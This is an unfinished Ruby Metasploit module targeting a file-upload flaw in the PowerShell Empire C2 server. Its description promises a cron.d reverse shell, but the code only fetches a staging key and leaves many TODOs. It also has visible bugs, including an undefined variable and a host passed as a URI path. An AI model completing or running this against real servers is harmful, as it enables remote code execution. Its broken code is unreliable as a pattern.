class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	# TODO get hash where vunerability was fixed
	# TODO create test docker container of empire 
	# TODO payload, targets, platform
	# Break POC down into small steps, mostly concerned with foregry of stages first

	# todo info not working

	# TODO verify the staging key has been recovered with a vunerable commit. 
	def initialize(info={})
		super(
			update_info(
				info,
				'Name' => 'PowerShellEmpire Arbitrary file Upload (Millennium Falcon)',

				'Description' => %q{This module exploits a vulnerability in PowerShellEmpire < 5.9.3 
					which allows for RCE via arbitary file uploads. This module will upload a file to the cron.d 
					directory to spawn a reverse shell. Thank you to AceResponder for the discovery of 
					this vunerability and original POC; and of course thank you to h00die for the module suggestion },

					'Author' => [
						'Ace Responder', # Original exploit discovery and POC
						'gardnerapp' # Metasploit module
					], 

					'License' => MSF_LICENSE,
					'References' => [
						'https://aceresponder.com/blog/exploiting-empire-c2-framework',
						'https://github.com/ACE-Responder/Empire-C2-RCE-PoC',
					],
					'Payload'         =>
					        {
					          'DisableNops' => true,
					        },
				      'Platform'        => %w{ linux python },
				      'Targets'         =>
				        [
				          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],
				          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
				          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]
				        ],
				))

			register_options(
				[
					Opt::RPORT(80),
					Opt::RHOST('192.168.0.19')
				])
	end 


	# Recovers the staging key, spoofs step0 of stager process
	# Staging URI is subject to change
	def get_staging_key
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => normalize_uri(datastore['RHOST'], '/download/python')
		})

		#return unless res && res.code == 200

		puts "Response from '/download/python/ : #{res.code}\n\n#{res}"

		puts "BODY -> #{res.body}"

		
		staging_key
	end 

	def exploit
		# grab the staging key from the server and start spoofing as a stager
		get_staging_key
	end 
end 